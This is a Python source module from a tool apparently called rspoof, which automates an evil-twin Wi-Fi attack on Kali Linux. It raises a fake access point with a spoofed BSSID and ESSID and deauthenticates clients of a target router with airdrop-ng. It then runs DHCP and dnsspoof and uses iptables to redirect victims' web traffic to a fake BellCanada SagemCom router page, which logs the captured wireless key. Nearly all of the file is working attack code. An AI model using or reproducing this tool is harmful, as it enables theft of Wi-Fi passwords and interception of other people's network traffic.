#!/usr/bin/env python
# -*- coding: Utf-8 -*-

# rsfunctions.py
# Functions for p_install.py 
# Scripted for Kali Linux GNOME x64

import os, subprocess, pexpect, shlex
from lib.shutdown import Clean_Exit
from sys import exit as sysexit
from commands import getoutput
from threading import Thread
from time import sleep
from os import chdir
from config.core import *

# global vars
airbase_interface = ""
airbase_channel = ""
airbase_bssid = ""
airbase_essid = ""
airdrop_interface = ""
airodump_interface = ""

# global processes
airbase = None
dnsspoof = None
dhcpd = None

def configure_router_package():
    print("1: BellCanada - SagemCom")
    print("2: NOTIMPLEMENTED")
    router_selection = input("Select your router :")
    if router_selection == 1:
	chdir(WEBROOT_PATH)
      	os.system("tar -xvzf " + RSPOOF_PATH + "sites/bellsagemcom.tar.gz" + " --strip 1")
	os.system("chmod -R 777 " + WEBROOT_PATH)
	print("BellCanada - SagemCom Installed Successfully!")
    elif router_selection == 2:
	print("INSTALL COMPLETE")
    else :
	print("BAD ENTRY - RETRY")
        router_selection = input("Select your router :")


def screen_clear():
    os.system("clear")
    print("\n\t\t\t[rspoof]")

  
def configure_airbase():
    global airbase_interface
    global airbase_channel
    global airbase_bssid
    global airbase_essid
 
    airbase_interface = getoutput("airmon-ng start " + PRIMARY_WLAN_INTERFACE + """ | awk '$0 ~ /monitor mode enabled/ {print $5}'""").replace(')','')
    if not airbase_interface:
        print("Couldn't start monitor mode on the interface " + PRIMARY_WLAN_INTERFACE)
        return None

    #SET THE airbase_bssid
    airbase_bssid = raw_input("\nEnter the BSSID to use. (leave blank to disable spoofing)\n>>> ")
    while (len(airbase_bssid) != 17) and (airbase_bssid.count(':') != 5):
        if airbase_bssid == '':
            airbase_bssid = getoutput('macchanger -s '+airbase_interface+" | grep Current | awk '{print $3}'")
            print("Using BSSID : " + airbase_bssid)
            break
        print("BSSID %s not valid, please try again." % airbase_bssid)
        airbase_bssid = raw_input("\nEnter the BSSIDto use. (leave blank to disable spoofing)\n>>> ")

    #SET THE airbase_essid
    airbase_essid = raw_input("\nEnter the ESSID to use. (eg. MyWifiConnection)\n>>> ")
    while airbase_essid == '':
        print("The ESSID must not be empty!")
        airbase_essid = raw_input("\nEnter the ESSID to use. (eg. MyWifiConnection)\n>>> ")

    #SET THE airbase_channel
    airbase_channel = raw_input("\nEnter the channel to use. (eg. 6)\n>>> ")
    while not airbase_channel.isdigit() and not (0 < int(airbase_channel) < 14):
        print("Channel %s is not a valid channel, please try again. (1-15 only)")
        airbase_channel = raw_input("\nEnter the channel to use. (eg. 6)\n>>> ")

def configure_airdrop():
    global airdrop_interface
    global airodump_interface
    #SET THE ATTACK BSSID
    attack_target_bssid = raw_input("\nEnter the target attack AP's airbase_bssid. (eg. 11:22:33:44:55:66)\n>>> ")
    while not (len(attack_target_bssid) != 17) and (attack_target_bssid.count(':') != 5):
        print("airbase_bssid %s not valid, please try again." % airbase_bssid)
        airbase_bssid = raw_input("\nEnter the target attack AP's airbase_bssid. (eg. 11:22:33:44:55:66)\n>>> ")
        
    print("Configuring, please hold...")
    
    #START A MONITOR MODE FOR AIRODUMP - *AIRODROP NEEDS THE CSV FILES FROM AIRODUMP
    airodump_interface = getoutput("airmon-ng start " + SECONDARY_WLAN_INTERFACE + """ | awk '$0 ~ /monitor mode enabled/ {print $5}'""").replace(')','')
    if not airodump_interface:
        print("Couldn't start monitor mode on the interface " + SECONDARY_WLAN_INTERFACE)
        return None
              
    #START A MONITOR MODE FOR AIRDROP * possible bug in airdrop that laucnhes multiple interfaces.
    airdrop_interface = getoutput("airmon-ng start " + SECONDARY_WLAN_INTERFACE + """ | awk '$0 ~ /monitor mode enabled/ {print $5}'""").replace(')','')
    if not airdrop_interface:
        print("Couldn't start monitor mode on the interface " + SECONDARY_WLAN_INTERFACE)
        return None

    # Close any processes that would interfere with the airdrop attack.
    os.system("killall -I -q dhclient")
    os.system("killall -I -q dhclient3")
    os.system("killall -I -q NetworkManager")
    
    # Cleanup any old temp files.
    try:
        os.remove("/root/rspoof/logs/airodump-01.csv")
    except OSError:
        pass
    try:
        os.remove("/root/rspoof/logs/airodump-01.ivs")
    except OSError:
        pass
    try:
        os.remove("/root/rspoof/config/deauthrules.tmp")
    except OSError:
        pass
    os.system("""echo 'd/""" + attack_target_bssid + """|any' > /root/rspoof/config/deauthrules.tmp""")
    print("Launching airoump on " + airodump_interface)
    os.system("xterm -e airodump-ng -i %s --bssid %s -a --berlin 10 -w /root/rspoof/logs/airodump --output-format csv &>/dev/null &" % (airodump_interface, attack_target_bssid))
    sleep(7)
    

def config_iptables_ATx():
    subprocess.Popen("iptables --flush", shell=True).wait()
    subprocess.Popen("iptables --table nat --flush", shell=True).wait()
    subprocess.Popen("iptables --delete-chain", shell=True).wait()
    subprocess.Popen("iptables --append FORWARD --in-interface at0 -j ACCEPT", shell=True).wait()
    subprocess.Popen("iptables -t nat -A PREROUTING -p udp -j DNAT --to 208.67.222.222", shell=True).wait()
    subprocess.Popen("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j DNAT --to %s:80" % (LOCALHOST_IP), shell=True).wait()
    subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True).wait()


def config_iptables_ETHx():
    subprocess.Popen("iptables --flush", shell=True).wait()
    subprocess.Popen("iptables --table nat --flush", shell=True).wait()
    subprocess.Popen("iptables --delete-chain", shell=True).wait()
    subprocess.Popen("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE", shell=True).wait()
    subprocess.Popen("iptables --append FORWARD --in-interface at0 -j ACCEPT", shell=True).wait()
    subprocess.Popen("iptables -t nat -A PREROUTING -p udp -j DNAT --to 208.67.222.222", shell=True).wait()
    subprocess.Popen("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000", shell=True).wait()
    subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True).wait()    
    
    
def launch_airdrop():
    print("Launching airdrop-ng.")
    os.system("xterm -e airdrop-ng -i %s -t %s -r %s" % (airdrop_interface, "/root/rspoof/logs/airodump-01.csv", "/root/rspoof/config/deauthrules.tmp"))
    print("Press any key to end the attack.")
    raw_input()
    subprocess.Popen("killall -I -q 'airodump-ng'", shell=True).wait()
    subprocess.Popen("killall -I -q 'airdrop-ng'", shell=True).wait()
    subprocess.Popen("airmon-ng stop %s" % (airodump_interface), shell=True).wait()
    subprocess.Popen("airmon-ng stop %s" % (airdrop_interface), shell=True).wait()

    
def launch_wireless_ap():
    global airbase
    # execute modprobe tun
    subprocess.Popen("modprobe tun", shell=True).wait()
    # launch airbase-ng
    args = shlex.split('-a %s -e "%s" -c %s %s' % (airbase_bssid, airbase_essid, airbase_channel, airbase_interface))
    airbase = pexpect.spawn('airbase-ng', args)
    airbase.logfile = file(RSPOOF_PATH + 'logs/airbase.log','w')
    print("Launching airbase-ng for '%s' on '%s'..." % (airbase_bssid, airbase_interface))
    i = airbase.expect(["Access Point with BSSID %s started" % (airbase_bssid.upper()),  pexpect.EOF])
    if i==0:
        print("[ OK! ]")
        subprocess.Popen("ifconfig at0 up", shell=True).wait()
        subprocess.Popen("ifconfig at0 %s netmask 255.255.255.128" % (LOCALHOST_IP), shell=True).wait()
        subprocess.Popen("ifconfig at0 mtu 1500", shell=True).wait()
        subprocess.Popen("route add -net 192.168.1.128 netmask 255.255.255.128 gw %s" % (LOCALHOST_IP), shell=True).wait()
        # Write a config file in the site root path that contains the wireless AP name we just launched.
        # This file is used for the site to log the AP name next to the wireless key for reference.
        fo = open(WEBROOT_PATH + "config.rspoof", "w+")
        fo.write("<ESSID>" + airbase_essid + "</ESSID>")
        fo.close()
        subprocess.Popen("chown www-data:www-data " + WEBROOT_PATH + "config.rspoof", shell=True).wait()
        subprocess.Popen("chmod 777 " + WEBROOT_PATH + "config.rspoof", shell=True).wait()
        print("\n Access Point started successfully!")
        sleep(5)
    elif i==1:
        print("[ FAIL! ]")
        airbase.kill(0)
    

def launch_dhcpd_server():
    global dhcpd
    # launch dhcpd / dhcp3 / ics-dhcpd-server
    args = shlex.split("-d -f -cf " + RSPOOF_PATH + "config/dhcpd.conf -pf /var/run/dhcpd.pid at0")
    dhcpd = pexpect.spawn("dhcpd", args)
    dhcpd.logfile = file(RSPOOF_PATH + 'logs/dhcpd.log','w')
    print("Launching dhcpd for 'at0'...")
    i = dhcpd.expect(["Sending on ",  pexpect.EOF])
    if i==0:
        print("[ OK! ]")
    elif i==1:
        print("[ FAIL! ]")
        dhcpd.kill(0)


def launch_dnsspoof():
    global dnsspoof
    # launch dnsspoof
    args = shlex.split("-i at0 -f " + RSPOOF_PATH + 'config/dnsspoof_hosts.conf')
    dnsspoof = pexpect.spawn("dnsspoof", args)
    dnsspoof.logfile = file(RSPOOF_PATH + 'logs/dnsspoof.log','w')
    print("Launching dnsspoof for 'at0'...")
    i = dnsspoof.expect(["dnsspoof: listening on at0",  pexpect.EOF])
    if i==0:
        print("[ OK! ]")
    elif i==1:
        print("[ FAIL! ]")
        dnsspoof.kill(0)


def launch_depedency_validator():
    if getoutput('whoami') != 'root':
        print("You have to be root to run rspoof!")
        input("Press Enter to continue...")
        sys.exit(-1)
    while PRIMARY_WLAN_INTERFACE not in getoutput('iwconfig'):
        print("Primary interface %s not found!" % (PRIMARY_WLAN_INTERFACE))
        input("Press Enter to continue...")
        sys.exit(-1)
    while SECONDARY_WLAN_INTERFACE not in getoutput('iwconfig'):
        print("Secondary interface %s not found!" % (SECONDARY_WLAN_INTERFACE))
        input("Press Enter to continue...")
        sys.exit(-1)
    if (not which("airdrop-ng")):
        print("WARNING! airdrop-ng is not present on the system.")
        input("Press Enter to continue...")
        sys.exit(-1)
    if (not which("airbase-ng")):
        print("WARNING! airbase-ng is not present on the system.")
        input("Press Enter to continue...")
        sys.exit(-1)
    if (not which("dhcpd")):
        print("WARNING! isc-dhcp-server is not present on the system.")
        input("Press Enter to continue...")
        sys.exit(-1)
    if (not which("apache2")):
        print("WARNING! apache2 is not present on the system.")
        input("Press Enter to continue...")
        sys.exit(-1)
    if (not which("dnsspoof")):
        print("WARNING! dnsspoof is not present on the system.")
        input("Press Enter to continue...")
        sys.exit(-1)


def which(program):
    def is_exe(fpath):
        return os.path.isfile(fpath) and os.access(fpath, os.X_OK)

    fpath, fname = os.path.split(program)
    if fpath:
        if is_exe(program):
            return True
    else:
        for path in os.environ["PATH"].split(os.pathsep):
            path = path.strip('"')
            exe_file = os.path.join(path, program)
            if is_exe(exe_file):
                return True

    return False

def stop_attacks():
    if airbase:
        airbase.kill(0)
        subprocess.Popen("airmon-ng stop " + airbase_interface, shell=True).wait()
    if dnsspoof:
        dnsspoof.kill(0)
    if dhcpd:
        dhcpd.kill(0)
    Clean_Exit()

 #  END 
